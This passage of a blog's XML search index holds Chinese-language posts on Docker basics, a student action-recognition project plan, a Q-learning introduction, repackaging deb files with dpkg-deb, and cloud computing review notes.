      <url>/2019/03/27/2019-03-27-docker%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<p>咕</p><a id="more"></a><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><ul><li>dockerhub ： <a href>waynamigo</a><br>Let’s try a first example. Here’s a dummy equation:</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><h2 id="U"><a href="#U" class="headerlink" title="U"></a>U</h2><h2 id="D"><a href="#D" class="headerlink" title="D"></a>D</h2>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker笔记整理（一）</title>
      <link href="/2019/03/21/2019-03-21-docker%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%E4%B8%80/"/>
      <url>/2019/03/21/2019-03-21-docker%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<p>基本使用方法</p><a id="more"></a><h2 id="使用docker仓库"><a href="#使用docker仓库" class="headerlink" title="使用docker仓库"></a>使用docker仓库</h2><ul><li><p>首先，docker的一个镜像是由多层组成的，每一层一个id，在pull的时候可以看到</p></li><li><p>以下面为例，imageID是镜像的唯一id，但是镜像的完整id是第三行的sha256哈希值，使用docker images 指令的时候，默认id的位数显示是截断的，可以后跟参数<strong>–no-trunc=true</strong>来显示全部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID</span><br><span class="line">ubuntu              latest              94e814e2efa8</span><br><span class="line">Digest: sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499</span><br><span class="line">从官方下载，默认  docker pull &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">如果从第三方下载，需要在仓库前指定完整仓库地址（例如hub.c.163.com/public/&lt;image&gt;:&lt;tag&gt;）</span><br></pre></td></tr></table></figure></li><li><p>如果感觉DockerHub慢的话，可以使用镜像代理 <a href="https://registry.docker-cn.com。" target="_blank" rel="noopener">https://registry.docker-cn.com。</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/docker.service.d/http_proxy.conf </span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">"HTTPS_PROXY=https://registry.docker-cn.com"</span></span><br><span class="line">然后</span><br><span class="line">systemctl daemon-reload，先reload units，重新加载一下配置单元，再重启docker服务</span><br><span class="line">systemctlrestart docker</span><br></pre></td></tr></table></figure></li><li><p>除了docker images，还有一个docker inspect &lt;image&gt;:&lt;tag&gt; 查看详细信息(json)</p></li><li><p>docker history &lt;image&gt;:&lt;tag&gt;查看历史信息</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">"Id"</span>: <span class="string">"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499"</span>,</span><br><span class="line">        <span class="attr">"RepoTags"</span>: [</span><br><span class="line">       <span class="string">"ubuntu:latest"</span></span><br><span class="line">       ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h2 id="基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等"><a href="#基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等" class="headerlink" title="基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等"></a>基本操作，搜索，删除，清理本地遗留文件，创建自己的镜像等</h2><ul><li>docker search搜索镜像，也是按关键字来的。（你搜docker search mysql可以搜到MariaDB</li><li>docker image prune -f，强删本地垃圾。<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3></li><li>基于本地已有镜像创建，docker commit，和git格式差不多</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式：docker commit -m <span class="string">'message'</span> -a <span class="string">'authorname'</span> &lt;changed imageid or name&gt; &lt;yourimage&gt;:&lt;tag&gt;</span><br><span class="line">docker commit -m <span class="string">'add one file'</span> -a <span class="string">'waynamigo'</span> c4b6b5b3e7d8 myimage:waynamigo</span><br><span class="line"></span><br><span class="line">ps:另外两个参数为</span><br><span class="line">-c 执行dockerfile，在后面整理</span><br><span class="line">-p 提交时暂停容器的进程</span><br></pre></td></tr></table></figure><ul><li>基于本地模板导入（只用了OpenVZ提供的一个linux模板搞了一下，准备有时间拿上学期的floppylinux的文件弄一个镜像</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;filename&gt; | docker import - &lt;image&gt;:&lt;tag&gt;,后者为自定义的名字，导入成功后会显示镜像id</span><br></pre></td></tr></table></figure><ul><li>基于dockerfile创建镜像，下面是一个demo</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FROM centos #指定基镜像 </span><br><span class="line"></span><br><span class="line">MAINTAINER waynamigo #该镜像维护者的信息（我）</span><br><span class="line"></span><br><span class="line">COPY jdk1.8.0_79 jdk1.8.0_79 #从centos复制jdk，（竟然没有openjdk。。。还得配置环境变量</span><br><span class="line">ADD &lt;localfile&gt; # 跑了一个jar。。</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME=/jdk1.8.0_79</span><br><span class="line">ENV PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">ENV CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"></span><br><span class="line">EXPOSE 8080 #开放8080端口，其实不用写，因为jar里面已经把yml的配置打包好了</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [<span class="string">"java"</span>,<span class="string">"-jar"</span>,<span class="string">"/filename"</span>]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t waynamigo:webapp .</span><br><span class="line">生成后就可以创建容器并运行了</span><br><span class="line">docker run -p localhost:8080:8080 --name webapp_running  waynamigo:webapp</span><br></pre></td></tr></table></figure><ul><li>不放心的话可以进去康康<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it waynamigo:webapp<span class="comment"># 运行这个docker容器</span></span><br><span class="line">top <span class="comment"># 看进程</span></span><br><span class="line">lsof -i:8080 <span class="comment"># 或者看端口占用</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><ul><li><p>导出到本地，格式类似gcc++</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save &lt;image&gt;:&lt;tag&gt; -o xxx.tar</span><br></pre></td></tr></table></figure></li><li><p>如果要重新导入，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker load -i xxx.tar</span><br><span class="line">docker load &lt; xxx.tar</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><ul><li><del>还是git</del>，docker push</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先上传到本地仓库（误</span><br><span class="line">docker tag &lt;image&gt;:&lt;tag&gt; waynamigo/&lt;image&gt;:&lt;tag&gt;</span><br><span class="line">然后push</span><br><span class="line">docker push waynamigo/&lt;image&gt;:&lt;tag&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学期项目-begining</title>
      <link href="/2019/03/06/2019-03-06-%E5%AD%A6%E6%9C%9F%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8/"/>
      <url>/2019/03/06/2019-03-06-%E5%AD%A6%E6%9C%9F%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容</p><a id="more"></a><h2 id="Vision"><a href="#Vision" class="headerlink" title="Vision"></a>Vision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Through image, video recognition, text recognition, the</span><br><span class="line">students&apos; words and deeds are processed by the system to determine whether it has adverse effects on public civilization.</span><br></pre></td></tr></table></figure><h2 id="Environment-Support"><a href="#Environment-Support" class="headerlink" title="Environment Support"></a>Environment Support</h2><ol><li>Keras 2.0/2.2</li><li>Tensorflow 1.2</li><li><del>Pytorch</del><h2 id="Main-References"><a href="#Main-References" class="headerlink" title="Main References"></a>Main References</h2>I GET THE set of papers from <a href="https://blog.csdn.net/whfshuaisi/article/details/79116265" target="_blank" rel="noopener"><strong>HERE</strong></a><br><a href="https://arxiv.org/pdf/1505.00487.pdf" target="_blank" rel="noopener">VIDEO TO TEXT</a><br><a href="https://arxiv.org/pdf/1411.4555.pdf" target="_blank" rel="noopener">IMAGE CAPTION</a><br><a href="https://arxiv.org/abs/1506.01497" target="_blank" rel="noopener">GET THE NAME FORM DETAIL F-CNN</a><br><a href="https://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Donahue_Long-Term_Recurrent_Convolutional_2015_CVPR_paper.pdf" target="_blank" rel="noopener">CVPR</a><h3 id="Two-stream"><a href="#Two-stream" class="headerlink" title="Two-stream"></a>Two-stream</h3>The development of my Action-Recgnization module is based on <a href="https://arxiv.org/abs/1406.2199" target="_blank" rel="noopener"><strong>Two Stream</strong></a> 《Two-StreamConvolutional Networks for Action  Recognition in Videos》.</li></ol><h3 id="Reasons-of-using-Two-stream"><a href="#Reasons-of-using-Two-stream" class="headerlink" title="Reasons of using Two-stream"></a>Reasons of using Two-stream</h3><p> The Action-Recgnization is developed on the way of Two-Stream recent years,And researchers have come out many papers on IEEE SCI and others.but the main reason is that I did Video caption last year, both of them are Analyzing Video Infomation, I want try other algorithm to finish my project in higher quality(<del>get higher score</del>). </p><h3 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h3><p>Graphviz</p><ul><li>using dot generate this picture<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p><strong>the basic of Two-Stream is The Fusion of spatiotemporal information in a dual stream network.</strong><br>or<br><strong>The KEY POINT is  the better Fusion of spatial and temporal features</strong></p><ul><li>The interaction between layers within a single network, such as ResNet/Inception.</li><li>between dual-stream networks, including the exploration of different fusion methods. It is worth considering the structure of ResNet and connecting the dual-stream network.</li></ul><p>This project use the second method.</p><h4 id="Spatial-network"><a href="#Spatial-network" class="headerlink" title="Spatial network"></a>Spatial network</h4><p>It mainly captures important object features in video frames.</p><h4 id="Time-series-network"><a href="#Time-series-network" class="headerlink" title="Time series network"></a>Time series network</h4><p>both of them : finetune the ImageNet</p><h2 id="Document-Quality-Attributes"><a href="#Document-Quality-Attributes" class="headerlink" title="Document-Quality Attributes"></a>Document-Quality Attributes</h2><p>Each contains:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── Avaliability(Quality Attributes eg.)</span><br><span class="line">     ├── Scenario</span><br><span class="line">     ├── Stimulus Source</span><br><span class="line">     ├── Stimulus</span><br><span class="line">     ├── Artifact</span><br><span class="line">     ├── Environment</span><br><span class="line">     ├── Response</span><br><span class="line">     ├── Response measure</span><br><span class="line">     └── Tactics</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center"></th><th align="center">Avaliability</th><th align="center">Performance</th><th align="center">Modifiability</th><th align="center">Usability</th><th align="center">Security</th><th align="center">Testability</th></tr></thead><tbody><tr><td align="center">Scenario</td><td align="center">Can not identify bad behavior</td><td align="center">The exported files are shown well</td><td align="center">New demands&amp;Structural optimization</td><td align="center">Customers want to export statistics file easily and need a reliable data</td><td align="center">Databases  is intruded</td><td align="center">Unit testing</td></tr><tr><td align="center">Stimulus Source</td><td align="center">System dependencies</td><td align="center">Customers</td><td align="center">Developers and Customers</td><td align="center">Customers</td><td align="center">Attackers</td><td align="center">Developers</td></tr><tr><td align="center">Stimulus</td><td align="center">Can’t solve information of the video</td><td align="center">Exporting operation</td><td align="center">Customers</td><td align="center">Runtime(?)</td><td align="center">Sql injection&amp;entitlement</td><td align="center">Unit testing each module</td></tr><tr><td align="center">Artifact</td><td align="center">whole system</td><td align="center">UI</td><td align="center">system</td><td align="center">UI</td><td align="center">DBMS</td><td align="center">Code</td></tr><tr><td align="center">Environment</td><td align="center">Windows/Linux x86_64/32 in Runtime environment</td><td align="center">Web browser</td><td align="center">Runtime environment</td><td align="center">Web browser</td><td align="center">Firewall&amp;Encryption</td><td align="center">Runtime environment</td></tr><tr><td align="center">Response</td><td align="center">Send a feedback to backend if can’t analyze the video from surveillance cameras;Retry if can’t export the list of score</td><td align="center">Export statistics files in 10s</td><td align="center">Extend and modify functions when come out a new demand</td><td align="center">Provide a easy-operated UI and reliable information</td><td align="center">Resist intrusion</td><td align="center">Each module passed the Test Cases</td></tr><tr><td align="center">Response measure</td><td align="center">within 5min;within 5s</td><td align="center">within 10s</td><td align="center">All modules is extensible and under the control of the evaluation indexs</td><td align="center">The satisfaction of user</td><td align="center">Database is protected</td><td align="center">Developers</td></tr><tr><td align="center">Tactics</td><td align="center">Retry Self-test</td><td align="center">Increase Resource Efficiency</td><td align="center">Split Module</td><td align="center">aaa</td><td align="center">warm backup</td><td align="center">Limit Non-determinism</td></tr></tbody></table><h3 id="Project-Details"><a href="#Project-Details" class="headerlink" title="Project Details"></a>Project Details</h3><ul><li>This project explores prominent action recognition models with UCF-101 dataset</li><li>Perfomance of different models are compared and analysis of experiment results are provided</li></ul><h2 id="To-be-continued"><a href="#To-be-continued" class="headerlink" title="To be continued"></a>To be continued</h2>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强化学习DQN简介</title>
      <link href="/2019/03/02/2019-03-02-%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%AD%A5/"/>
      <url>/2019/03/02/2019-03-02-%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<p>QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自<a href="https://blog.csdn.net/qq_16234613/article/details/80268564" target="_blank" rel="noopener">https://blog.csdn.net/qq_16234613/article/details/80268564</a></p><a id="more"></a><h1 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">预设值：首先将图中的每一条边预设reward，目标节点指向自己的邻接边的reward设100，其他设为0</span><br><span class="line">Q、R矩阵： 包括状态action和行为state，作为行列</span><br><span class="line">环境反馈: 对于每一次的episode （相当于迭代的东西），每一次尝试attemp，会根据反馈进行对网络更新</span><br><span class="line">环境更新.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">R+r*max_Q(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">基本规则如下：</span><br><span class="line">Q表内容为index--state（agent的位置），columns--action(行为集)</span><br><span class="line">Q表（记录行为值）的计算规则是每次对于行为集合中的每一个action，对其进行计算、并进行选择。</span><br><span class="line">每一次episode，Q表更新一次</span><br><span class="line">定义EPSILON的目的是控制贪婪程度，其中，它可以随着时间推移 逐渐增加，贪婪)</span><br></pre></td></tr></table></figure><ul><li>主循环：图示<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2-1-1.png)" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><p>首先要对其评估和更新准则进行确定，代码中表示可以直接定义在一个结构中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_env</span><span class="params">(S, episode, step_counter)</span>:</span></span><br><span class="line">    <span class="comment"># This is how environment be updated</span></span><br><span class="line">    env_list = [<span class="string">'-'</span>]*(N_STATES<span class="number">-1</span>) + [<span class="string">'T'</span>]   <span class="comment"># '---------T' our environment</span></span><br><span class="line">    <span class="keyword">if</span> S == <span class="string">'terminal'</span>:</span><br><span class="line">        interaction = <span class="string">'Episode %s: total_steps = %s'</span> % (episode+<span class="number">1</span>, step_counter)</span><br><span class="line">        print(<span class="string">'\r&#123;&#125;'</span>.format(interaction), end=<span class="string">''</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">'\r                                '</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        env_list[S] = <span class="string">'o'</span></span><br><span class="line">        interaction = <span class="string">''</span>.join(env_list)</span><br><span class="line">        print(<span class="string">'\r&#123;&#125;'</span>.format(interaction), end=<span class="string">''</span>)</span><br><span class="line">        time.sleep(FRESH_TIME)</span><br></pre></td></tr></table></figure><h2 id="demo-参考莫烦python的一个例子"><a href="#demo-参考莫烦python的一个例子" class="headerlink" title="demo,参考莫烦python的一个例子"></a>demo,参考莫烦python的一个例子</h2><p>预先设置的参数，就是上述的预设值，其中gamma参数是作为奖励递减值，作用见后文代码，它是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N_STATES =  <span class="comment">#1维宽度</span></span><br><span class="line">ACTIONS =  <span class="comment">#动作集合</span></span><br><span class="line">EPSILON = <span class="comment">#greedy贪婪值</span></span><br><span class="line">ALPHA =  <span class="comment"># learning rate 学习率</span></span><br><span class="line">GAMMA =  <span class="comment"># discount factor 奖励递减值</span></span><br><span class="line">MAX_EPISODES =  <span class="comment"># maximum episodes 最大回合数</span></span><br></pre></td></tr></table></figure><p>Q表的行和列存储action和state，它的Value 每一次更新就是更新它的<strong>行为准则</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_q_table</span><span class="params">(n_states, actions)</span>:</span></span><br><span class="line">    table = pd.DataFrame(</span><br><span class="line">        np.zeros((n_states, len(actions))),</span><br><span class="line">        columns=actions,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> table</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reinforcement Learing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> DQN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决软件源更新，旧版本软件应用无法使用的问题</title>
      <link href="/2019/01/17/2019-01-17-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%BF%AE%E6%94%B9deb%E4%BE%9D%E8%B5%96/"/>
      <url>/2019/01/17/2019-01-17-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%BF%AE%E6%94%B9deb%E4%BE%9D%E8%B5%96/</url>
      
        <content type="html"><![CDATA[<p>简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例</p><a id="more"></a><hr><h1 id="查看软件包里的文件内容-不必要，只是避免好久不用忘了参数"><a href="#查看软件包里的文件内容-不必要，只是避免好久不用忘了参数" class="headerlink" title="查看软件包里的文件内容(不必要，只是避免好久不用忘了参数"></a>查看软件包里的文件内容(不必要，只是避免好久不用忘了参数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -c neteasemusic.deb</span><br></pre></td></tr></table></figure><h1 id="用dpkg解压"><a href="#用dpkg解压" class="headerlink" title="用dpkg解压"></a>用dpkg解压</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将软件包中的文件释放到extracted目录下</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -x neteasemusic.deb extracted/</span><br></pre></td></tr></table></figure><h1 id="解压deb包中DEBIAN目录下的文件"><a href="#解压deb包中DEBIAN目录下的文件" class="headerlink" title="解压deb包中DEBIAN目录下的文件"></a>解压deb包中DEBIAN目录下的文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将主控信息解压，control中包括了所有依赖</span><br></pre></td></tr></table></figure><ul><li>dpkg创建包的时候，依赖的控制信息在DEBIAN文件夹中，所以首先要创建一个DEBIAN文件夹（大写</li></ul><p>否则会出现错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb: error: failed to open package info file <span class="string">'build//DEBIAN/control'</span> <span class="keyword">for</span> reading: No such file or directory</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -e neteasemusic.deb extracted/DEBIAN</span><br></pre></td></tr></table></figure><h1 id="创建debian软件包"><a href="#创建debian软件包" class="headerlink" title="创建debian软件包"></a>创建debian软件包</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -b extract/ ./</span><br></pre></td></tr></table></figure><h1 id="参数如下"><a href="#参数如下" class="headerlink" title="参数如下"></a>参数如下</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* -c：显示软件包中的文件列表；</span><br><span class="line">* -e：将主控信息解压；</span><br><span class="line">* -f：把字段内容打印到标准输出；</span><br><span class="line">* -x：将软件包中的文件释放到指定目录下；</span><br><span class="line">* -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；</span><br><span class="line">* -w：显示软件包的信息；</span><br><span class="line">* -l：显示软件包的详细信息；</span><br><span class="line">* -R：提取控制信息和存档的清单文件；</span><br><span class="line">* -b：创建debian软件包。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debian </tag>
            
            <tag> dpkg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云计算复习</title>
      <link href="/2019/01/08/2019-01-08-%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
      <url>/2019/01/08/2019-01-08-%E4%BA%91%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<p>云计算概论</p><a id="more"></a><hr><h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 云计算的定义</span><br><span class="line">* 云计算的人群</span><br></pre></td></tr></table></figure><h2 id="云计算的特征"><a href="#云计算的特征" class="headerlink" title="云计算的特征"></a>云计算的特征</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">超大规模</span><br><span class="line">高可扩展性</span><br><span class="line">虚拟化</span><br><span class="line">高可靠性</span><br><span class="line">通用性</span><br><span class="line">廉价性</span><br><span class="line">灵活定制</span><br></pre></td></tr></table></figure><h2 id="云计算的优点"><a href="#云计算的优点" class="headerlink" title="云计算的优点"></a>云计算的优点</h2><ul><li>虚拟化技术</li><li>动态可扩展</li><li>按需部署</li><li>高灵活性</li><li>高可靠性</li><li>高性价比</li></ul><table><thead><tr><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">降低用户计算机的成本</td><td align="center">要求持续的网络连接</td></tr><tr><td align="center">改善性能</td><td align="center">低带宽网络连接环境下不能很好地工作</td></tr><tr><td align="center">降低IT基础设施投资</td><td align="center">反应慢</td></tr><tr><td align="center">减少维护问题</td><td align="center"></td></tr><tr><td align="center">减少软件开支</td><td align="center"></td></tr><tr><td align="center">即时的软件更新</td><td align="center"></td></tr><tr><td align="center">计算能力的增长</td><td align="center">功能有限制</td></tr><tr><td align="center">无限的存储能力</td><td align="center"></td></tr><tr><td align="center">增强的数据安全性</td><td align="center">无法确保数据的安全性</td></tr><tr><td align="center">改善操作系统的兼容性</td><td align="center"></td></tr><tr><td align="center">改善文档格式的兼容性</td><td align="center">不能保证数据不会丢失</td></tr><tr><td align="center">简化团队协作</td><td align="center"></td></tr><tr><td align="center">没有地点限制的数据获取</td><td align="center"></td></tr><tr><td align="center">绿色计算思想的实现者</td><td align="center"></td></tr></tbody></table><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>服务类型： 基础设施、平台、应用<br>部署范围： 公有、私有、混合</p><ul><li>并行计算、分布式计算、网格计算属于计算科学</li><li>云计算、效用计算属于计算模式、商业模式<h2 id="与网格计算的区别："><a href="#与网格计算的区别：" class="headerlink" title="与网格计算的区别："></a>与网格计算的区别：</h2></li><li>网格是共享资源、协同计算，是一种资源共享模型。</li><li>而云计算采用网络将集群资源连接在一起，单向提供给用户资源进行数据处理。</li><li><strong>资源调度模式</strong> ：云计算以数据为中心，采用集群存储管理资源；网格计算以计算为中心，资源分布在各地。云计算进一步将硬件虚拟化。<h2 id="云计算体系结构"><a href="#云计算体系结构" class="headerlink" title="云计算体系结构"></a>云计算体系结构</h2>IaaS、PaaS、SaaS</li><li>infrastructure asa service： 硬件 资源</li><li>platform asa service： 软件环境</li><li>software asa service：应用程序</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPS.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="云存储结构-GFS-Google-File-System-HDFS-Hadoop-Distributed-File-System"><a href="#云存储结构-GFS-Google-File-System-HDFS-Hadoop-Distributed-File-System" class="headerlink" title="云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System)"></a>云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System)</h2><ul><li>存储层</li><li>基础管理层</li><li>应用接口层</li><li>访问层<h2 id="云计算技术体系结构"><a href="#云计算技术体系结构" class="headerlink" title="云计算技术体系结构"></a>云计算技术体系结构</h2></li><li>物理资源层：计算机、存储器、网络设施、数据库、软件</li><li>资源池层：将大量相同类型的资源构成资源池</li><li>管理中间件层： 资源管理、任务管理、用户管理、安全管理</li><li>SOA(Service-Oriented Architecture）构建层：将云计算能力封装成标准的Web Services</li></ul><h2 id="云计算的两条底层技术路线"><a href="#云计算的两条底层技术路线" class="headerlink" 